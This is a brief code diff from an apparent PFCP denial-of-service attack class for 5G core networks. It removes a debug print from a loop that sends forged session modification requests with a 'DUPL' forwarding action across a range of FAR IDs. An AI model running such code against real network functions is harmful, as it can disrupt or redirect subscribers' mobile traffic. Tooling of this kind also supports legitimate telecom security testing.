@@ -635,7 +635,6 @@ class PFCPDosAttack:
             
             for farId in range(1, far_range):
                 packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId, apply_action="DUPL")
-                packet.show()
                 res = sr1(packet)
                 pfcp_cause = None
                 for ie in res[PFCP].IE_list:
